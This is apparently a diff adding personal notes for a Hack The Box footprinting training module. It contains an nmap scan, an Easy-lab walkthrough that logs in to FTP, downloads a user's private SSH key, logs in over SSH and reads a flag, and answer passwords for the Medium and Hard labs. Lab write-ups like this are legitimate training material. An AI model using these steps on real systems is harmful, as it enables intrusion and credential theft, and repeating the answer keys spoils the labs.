@@ -230,3 +230,140 @@ Answer: trinity
 Source: https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/
 
 Change the PASS_FILE option to rockyou.txt file 
+
+
+# Footprinting Lab - Easy
+
+```
+└──╼ [★]$ nmap -sC -sV 10.129.22.153
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-17 23:40 CDT
+Nmap scan report for 10.129.22.153
+Host is up (0.0095s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.22.153]
+|     Invalid command: try being more creative
+|     Invalid command: try being more creative
+|   NULL: 
+|_    220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.22.153]
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
+|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
+|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
+53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+2121/tcp open  ftp
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 ProFTPD Server (Ceil's FTP) [10.129.22.153]
+|     Invalid command: try being more creative
+|     Invalid command: try being more creative
+|   NULL: 
+|_    220 ProFTPD Server (Ceil's FTP) [10.129.22.153]
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port21-TCP:V=7.94SVN%I=7%D=8/17%Time=68A2AEAA%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,40,"220\x20ProFTPD\x20Server\x20\(ftp\.int\.inlanefreight\.htb\)\x2
+SF:0\[10\.129\.22\.153\]\r\n")%r(GenericLines,9C,"220\x20ProFTPD\x20Server
+SF:\x20\(ftp\.int\.inlanefreight\.htb\)\x20\[10\.129\.22\.153\]\r\n500\x20
+SF:Invalid\x20command:\x20try\x20being\x20more\x20creative\r\n500\x20Inval
+SF:id\x20command:\x20try\x20being\x20more\x20creative\r\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port2121-TCP:V=7.94SVN%I=7%D=8/17%Time=68A2AEAA%P=x86_64-pc-linux-gnu%r
+SF:(NULL,31,"220\x20ProFTPD\x20Server\x20\(Ceil's\x20FTP\)\x20\[10\.129\.2
+SF:2\.153\]\r\n")%r(GenericLines,8D,"220\x20ProFTPD\x20Server\x20\(Ceil's\
+SF:x20FTP\)\x20\[10\.129\.22\.153\]\r\n500\x20Invalid\x20command:\x20try\x
+SF:20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20bei
+SF:ng\x20more\x20creative\r\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 96.28 seconds
+```
+
+Login to FTP:
+```
+└──╼ [★]$ ftp 10.129.22.153 2121
+Connected to 10.129.22.153.
+220 ProFTPD Server (Ceil's FTP) [10.129.22.153]
+Name (10.129.22.153:root): ceil
+331 Password required for ceil
+Password: 
+230 User ceil logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+```
+
+Getting ssh public keys:
+
+```
+ftp> cd .ssh
+250 CWD command successful
+ftp> ls
+229 Entering Extended Passive Mode (|||42994|)
+150 Opening ASCII mode data connection for file list
+-rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
+-rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
+-rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub
+226 Transfer complete
+ftp> get id_rsa
+local: id_rsa remote: id_rsa
+```
+
+Getting SSH environment:
+
+```
+└──╼ [★]$ ssh ceil@10.129.22.153 -i id_rsa 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon 18 Aug 2025 04:58:13 AM UTC
+
+  System load:  0.0               Processes:               177
+  Usage of /:   86.3% of 3.87GB   Users logged in:         0
+  Memory usage: 14%               IPv4 address for ens192: 10.129.22.153
+  Swap usage:   0%
+
+  => / is using 86.3% of 3.87GB
+
+
+116 updates can be installed immediately.
+1 of these updates is a security update.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Wed Nov 10 05:48:02 2021 from 10.10.14.20
+ceil@NIXEASY:~$ ls
+ceil@NIXEASY:~$ cd ..
+ceil@NIXEASY:/home$ ls
+ceil  cry0l1t3  flag
+ceil@NIXEASY:/home$ cd flag
+ceil@NIXEASY:/home/flag$ ls
+flag.txt
+ceil@NIXEASY:/home/flag$ cat flag.txt
+HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
+
+```
+
+# Footprinting Lab - Medium
+
+Question:  Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer.
+
+Answer: lnch7ehrdn43i7AoqVPK4zWR
+
+# Foorprinting Lab - Hard
+
+Question: Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.
+
+Answer: cr3n4o7rzse7rzhnckhssncif7ds
